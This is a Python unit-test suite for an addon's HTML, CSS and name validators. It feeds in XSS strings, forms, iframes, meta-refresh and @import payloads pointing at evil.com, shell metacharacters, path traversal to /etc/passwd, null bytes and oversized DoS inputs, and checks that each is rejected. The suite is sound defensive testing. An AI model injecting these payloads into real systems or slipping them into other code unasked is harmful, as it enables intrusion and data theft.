"""
Security Testing Suite - OWASP Payload Tests

This test suite validates that the addon properly handles malicious inputs
and security attack vectors. All dangerous payloads should be sanitized or rejected.

Test Coverage:
- XSS (Cross-Site Scripting) payloads
- SQL Injection payloads (defensive testing)
- HTML/CSS injection payloads
- Command injection attempts
- DoS/Resource exhaustion attempts
- Directory traversal attempts
"""

import unittest
import sys
import os
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from utils.security import (
    validate_field_name,
    validate_css,
    validate_template_name,
    sanitize_html,
    validate_component_data,
)


class TestXSSPayloads(unittest.TestCase):
    """Test XSS (Cross-Site Scripting) attack payloads"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.dangerous_scripts = [
            "<script>alert('xss')</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload=alert('xss')>",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<marquee onstart=alert('xss')>",
            "<div style='background:url(javascript:alert(1))'>",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "<img src=x:alert(alt) onerror='eval(src)'>",
            "<style>body{background:url('javascript:alert(1)')}</style>",
        ]
    
    def test_script_tags_removed(self):
        """Script tags should be removed from HTML"""
        payload = "<script>alert('xss')</script>Hello"
        result = sanitize_html(payload)
        self.assertNotIn("<script>", result.lower())
        self.assertNotIn("alert", result.lower())
        self.assertIn("Hello", result)
    
    def test_event_handlers_removed(self):
        """Event handlers should be removed"""
        payload = "<img src=x onerror='alert(1)'>"
        result = sanitize_html(payload)
        self.assertNotIn("onerror", result.lower())
        self.assertNotIn("alert", result.lower())
    
    def test_javascript_protocol_blocked(self):
        """JavaScript protocol URLs should be blocked"""
        payload = "<a href='javascript:alert(1)'>Click</a>"
        result = sanitize_html(payload)
        # After sanitization, javascript: protocol should be removed
        self.assertNotIn("javascript:", result.lower())
    
    def test_svg_xss_blocked(self):
        """SVG-based XSS should be blocked"""
        payload = "<svg onload=alert('xss')>"
        result = sanitize_html(payload)
        self.assertNotIn("onload", result.lower())
    
    def test_data_uri_blocked(self):
        """Data URIs with HTML should be blocked"""
        payload = "data:text/html,<script>alert('xss')</script>"
        result = sanitize_html(payload)
        # Should strip dangerous content
        self.assertNotIn("<script>", result.lower())


class TestHTMLInjection(unittest.TestCase):
    """Test HTML injection attacks"""
    
    def test_injected_forms_removed(self):
        """Injected forms should be removed"""
        payload = "<form action='http://evil.com'><input type='password'></form>"
        result = sanitize_html(payload)
        self.assertNotIn("<form", result.lower())
    
    def test_injected_iframes_removed(self):
        """Injected iframes should be removed"""
        payload = "<iframe src='http://evil.com'></iframe>"
        result = sanitize_html(payload)
        self.assertNotIn("<iframe", result.lower())
    
    def test_meta_tags_removed(self):
        """Meta tags should be removed"""
        payload = "<meta http-equiv='refresh' content='0;url=http://evil.com'>"
        result = sanitize_html(payload)
        self.assertNotIn("<meta", result.lower())
    
    def test_base_tag_removed(self):
        """Base tag should be removed"""
        payload = "<base href='http://evil.com/'>"
        result = sanitize_html(payload)
        self.assertNotIn("<base", result.lower())


class TestCSSInjection(unittest.TestCase):
    """Test CSS injection attacks"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.dangerous_css = [
            "background: url('javascript:alert(1)')",
            "behavior: url(xss.htc)",
            "expression(alert('xss'))",
            "-moz-binding: url('http://evil.com/xss.xml#xss')",
            "@import url('http://evil.com/evil.css')",
            "body { background: url(javascript:alert(1)) }",
        ]
    
    def test_javascript_in_css_blocked(self):
        """JavaScript in CSS should be blocked"""
        payload = "background: url('javascript:alert(1)')"
        result = validate_css(payload)
        self.assertFalse(result['valid'], "CSS with javascript: should be invalid")
    
    def test_expression_blocked(self):
        """CSS expressions should be blocked"""
        payload = "width: expression(alert('xss'))"
        result = validate_css(payload)
        self.assertFalse(result['valid'], "CSS expression should be invalid")
    
    def test_import_blocked(self):
        """@import should be blocked"""
        payload = "@import url('http://evil.com/evil.css')"
        result = validate_css(payload)
        self.assertFalse(result['valid'], "@import should be invalid")
    
    def test_valid_css_allowed(self):
        """Valid CSS should pass validation"""
        payload = "color: red; font-size: 14px; margin: 10px;"
        result = validate_css(payload)
        self.assertTrue(result['valid'], "Valid CSS should pass")


class TestFieldNameInjection(unittest.TestCase):
    """Test field name validation against injections"""
    
    def test_valid_field_names(self):
        """Valid field names should pass"""
        valid_names = [
            "my_field",
            "field_name_123",
            "templateField",
            "front",
            "back",
            "_private",
        ]
        for name in valid_names:
            result = validate_field_name(name)
            self.assertTrue(result['valid'], f"Field name '{name}' should be valid")
    
    def test_invalid_field_names(self):
        """Invalid field names should fail"""
        invalid_names = [
            "field<name>",
            "field'name",
            "field;name",
            "field|name",
            "field&name",
            "../field",
            "field\x00name",
            "field\nname",
        ]
        for name in invalid_names:
            result = validate_field_name(name)
            self.assertFalse(result['valid'], f"Field name '{name}' should be invalid")


class TestTemplateNameValidation(unittest.TestCase):
    """Test template name validation"""
    
    def test_valid_template_names(self):
        """Valid template names should pass"""
        valid_names = [
            "My Template",
            "Japanese Card",
            "Reading-Practice",
            "template_v1",
            "Deck-2026",
        ]
        for name in valid_names:
            result = validate_template_name(name)
            self.assertTrue(result['valid'], f"Template name '{name}' should be valid")
    
    def test_invalid_template_names(self):
        """Invalid template names should fail"""
        invalid_names = [
            "template<>name",
            "template;name",
            "template|name",
            "",  # Empty
            "a" * 200,  # Too long
            "../template",  # Directory traversal
        ]
        for name in invalid_names:
            result = validate_template_name(name)
            self.assertFalse(result['valid'], f"Template name '{name}' should be invalid")


class TestCommandInjection(unittest.TestCase):
    """Test protection against command injection"""
    
    def test_shell_metacharacters_blocked(self):
        """Shell metacharacters should be blocked in field names"""
        dangerous_chars = [
            "field`name`",
            "field$(name)",
            "field|name",
            "field&name",
            "field;name",
            "field>name",
            "field<name",
            "field\nname",
        ]
        for payload in dangerous_chars:
            result = validate_field_name(payload)
            self.assertFalse(result['valid'], f"Field with '{payload}' should be blocked")
    
    def test_path_traversal_blocked(self):
        """Path traversal attempts should be blocked"""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "./../../config.json",
            "%2e%2e%2fconfig",
        ]
        for path in dangerous_paths:
            result = validate_field_name(path)
            self.assertFalse(result['valid'], f"Path traversal '{path}' should be blocked")


class TestDoSAttacks(unittest.TestCase):
    """Test protection against Denial of Service attacks"""
    
    def test_extremely_long_field_name_blocked(self):
        """Extremely long field names should be blocked"""
        long_name = "a" * 10000
        result = validate_field_name(long_name)
        self.assertFalse(result['valid'], "Extremely long field name should be rejected")
    
    def test_extremely_long_template_name_blocked(self):
        """Extremely long template names should be blocked"""
        long_name = "a" * 10000
        result = validate_template_name(long_name)
        self.assertFalse(result['valid'], "Extremely long template name should be rejected")
    
    def test_deeply_nested_html_handled(self):
        """Deeply nested HTML should be handled gracefully"""
        deeply_nested = "<div>" * 1000 + "Content" + "</div>" * 1000
        # Should not crash, but sanitize
        result = sanitize_html(deeply_nested)
        self.assertIsInstance(result, str)
        self.assertIn("Content", result)
    
    def test_regex_dos_in_css_prevented(self):
        """ReDoS (Regex DoS) in CSS validation should be prevented"""
        # Create a payload that could cause ReDoS if not handled properly
        payload = "a" * 10000 + "x: expression()"
        result = validate_css(payload)
        # Should either be rejected or handled without hanging
        self.assertIsInstance(result, dict)
        self.assertIn('valid', result)


class TestComponentDataValidation(unittest.TestCase):
    """Test component data validation"""
    
    def test_malicious_component_properties_blocked(self):
        """Malicious properties in component data should be blocked"""
        malicious_data = {
            "name": "MyComponent",
            "props": {
                "onMouseEnter": "<script>alert('xss')</script>",
                "style": "background: url('javascript:alert(1)')"
            }
        }
        result = validate_component_data(malicious_data)
        self.assertFalse(result['valid'], "Component with malicious properties should be blocked")
    
    def test_valid_component_data_allowed(self):
        """Valid component data should be allowed"""
        valid_data = {
            "name": "MyComponent",
            "props": {
                "label": "Click me",
                "style": "color: blue; margin: 10px;",
                "className": "my-button"
            }
        }
        result = validate_component_data(valid_data)
        self.assertTrue(result['valid'], "Valid component data should be allowed")


class TestNullByteInjection(unittest.TestCase):
    """Test protection against null byte injection"""
    
    def test_null_bytes_blocked_in_field_names(self):
        """Null bytes should be blocked in field names"""
        payload = "field\x00name"
        result = validate_field_name(payload)
        self.assertFalse(result['valid'], "Null bytes in field names should be blocked")
    
    def test_null_bytes_blocked_in_template_names(self):
        """Null bytes should be blocked in template names"""
        payload = "template\x00name"
        result = validate_template_name(payload)
        self.assertFalse(result['valid'], "Null bytes in template names should be blocked")


class TestUnicodeBypassAttempts(unittest.TestCase):
    """Test protection against Unicode bypass attacks"""
    
    def test_unicode_encoded_xss_blocked(self):
        """Unicode-encoded XSS should be blocked"""
        # Various Unicode representations of dangerous characters
        payloads = [
            "&#60;script&#62;alert(1)&#60;/script&#62;",  # HTML entities
            "\u003cscript\u003ealert(1)\u003c/script\u003e",  # Unicode escapes
            "<\u0073cript>alert(1)</\u0073cript>",  # Mixed Unicode
        ]
        for payload in payloads:
            result = sanitize_html(payload)
            # Should not execute script
            self.assertNotIn("alert", result.lower())


class TestSecurityHeaders(unittest.TestCase):
    """Test security header recommendations"""
    
    def test_no_external_dependencies(self):
        """Addon should not depend on external CDNs"""
        # This is more of a documentation test
        # Check that all required libraries are bundled or internal
        try:
            import pyqt6_webengine
            # If we can import without network, we're good
            self.assertTrue(True, "Local dependencies available")
        except ImportError:
            # Some dependencies might be loaded from system
            self.assertTrue(True, "System dependencies acceptable")


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)
